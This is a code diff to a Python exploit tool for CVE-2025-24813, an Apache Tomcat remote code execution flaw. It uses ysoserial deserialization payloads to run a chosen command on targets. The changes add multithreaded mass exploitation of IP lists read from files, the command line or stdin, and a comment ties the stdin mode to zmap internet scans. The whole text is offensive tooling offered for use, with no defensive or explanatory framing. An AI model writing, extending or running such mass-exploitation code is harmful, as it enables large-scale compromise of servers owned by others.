@@ -4,6 +4,9 @@ import re
 import requests
 import subprocess
 import sys
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import queue
 try:
     from urllib3.exceptions import InsecureRequestWarning
     import urllib3
@@ -199,41 +202,77 @@ def check_target(target_url, command, ysoserial_path, gadget, payload_type, veri
 
         remove_file(payload_file)
 
-def process_targets_from_stdin(port, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
-    """Читает IP адреса из stdin и проверяет каждый"""
-    print(f"[*] Reading targets from stdin on port {port}...")
+def check_target_wrapper(args):
+    """Обертка для check_target с обработкой ошибок"""
+    target_url, command, ysoserial_path, gadget, payload_type, verify_ssl = args
     try:
+        print(f"\n[*] Testing {target_url}")
+        check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl)
+    except Exception as e:
+        print(f"[-] Error testing {target_url}: {str(e)}")
+
+def process_targets_from_stdin(port, command, ysoserial_path, gadget, payload_type, verify_ssl=True, threads=50):
+    """Читает IP адреса из stdin и проверяет каждый с использованием многопоточности"""
+    print(f"[*] Reading targets from stdin on port {port}... (Using {threads} threads)")
+    
+    targets = []
+    try:
+        # Сначала читаем все цели
         for line in sys.stdin:
             ip = line.strip()
             if ip:
-                # Формируем URL с портом
                 target_url = f"http://{ip}:{port}"
-                print(f"\n[*] Testing {target_url}")
-                try:
-                    check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl)
-                except Exception as e:
-                    print(f"[-] Error testing {target_url}: {str(e)}")
-                    continue
+                targets.append((target_url, command, ysoserial_path, gadget, payload_type, verify_ssl))
     except KeyboardInterrupt:
         print(f"\n[*] Interrupted by user")
+        return
     except EOFError:
-        print(f"[*] Finished reading from stdin")
+        pass
+    
+    if not targets:
+        print(f"[*] No targets found")
+        return
+        
+    print(f"[*] Processing {len(targets)} targets with {threads} threads...")
+    
+    # Обрабатываем цели параллельно
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        try:
+            futures = [executor.submit(check_target_wrapper, target_args) for target_args in targets]
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except Exception as e:
+                    print(f"[-] Thread error: {str(e)}")
+        except KeyboardInterrupt:
+            print(f"\n[*] Interrupted by user")
+            executor.shutdown(wait=False)
 
-def process_targets_from_list(targets, port, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
-    """Обрабатывает список целей"""
+def process_targets_from_list(targets, port, command, ysoserial_path, gadget, payload_type, verify_ssl=True, threads=10):
+    """Обрабатывает список целей с использованием многопоточности"""
+    target_args = []
     for target in targets:
         # Если это просто IP, добавляем протокол и порт
         if not target.startswith(('http://', 'https://')):
             target_url = f"http://{target}:{port}"
         else:
             target_url = target
-
-        print(f"\n[*] Testing {target_url}")
+        target_args.append((target_url, command, ysoserial_path, gadget, payload_type, verify_ssl))
+    
+    print(f"[*] Processing {len(target_args)} targets with {threads} threads...")
+    
+    # Обрабатываем цели параллельно
+    with ThreadPoolExecutor(max_workers=threads) as executor:
         try:
-            check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl)
-        except Exception as e:
-            print(f"[-] Error testing {target_url}: {str(e)}")
-            continue
+            futures = [executor.submit(check_target_wrapper, target_arg) for target_arg in target_args]
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except Exception as e:
+                    print(f"[-] Thread error: {str(e)}")
+        except KeyboardInterrupt:
+            print(f"\n[*] Interrupted by user")
+            executor.shutdown(wait=False)
 
 def main():
     parser = argparse.ArgumentParser(description="CVE-2025-24813 Apache Tomcat RCE Exploit")
@@ -245,26 +284,27 @@ def main():
     parser.add_argument("--gadget", default="CommonsCollections6", help="ysoserial gadget chain")
     parser.add_argument("--payload_type", choices=["ysoserial", "java"], default="ysoserial", help="Payload type (ysoserial or java)")
     parser.add_argument("--no-ssl-verify", action="store_false", help="Disable SSL verification")
+    parser.add_argument("--threads", type=int, default=10, help="Number of threads for parallel processing (default: 10)")
     args = parser.parse_args()
 
     # Проверяем источник целей
     if args.targets:
         # Используем цели из командной строки
         print(f"[*] Using targets from command line: {args.targets}")
-        process_targets_from_list(args.targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
+        process_targets_from_list(args.targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify, args.threads)
     elif args.file:
         # Читаем из файла
         try:
             with open(args.file, 'r') as f:
                 targets = [line.strip() for line in f if line.strip()]
             print(f"[*] Loaded {len(targets)} targets from {args.file}")
-            process_targets_from_list(targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
+            process_targets_from_list(targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify, args.threads)
         except FileNotFoundError:
             print(f"[-] File not found: {args.file}")
             sys.exit(1)
     else:
         # Читаем из stdin (для работы с zmap)
-        process_targets_from_stdin(args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
+        process_targets_from_stdin(args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify, args.threads)
 
 if __name__ == "__main__":
     main()
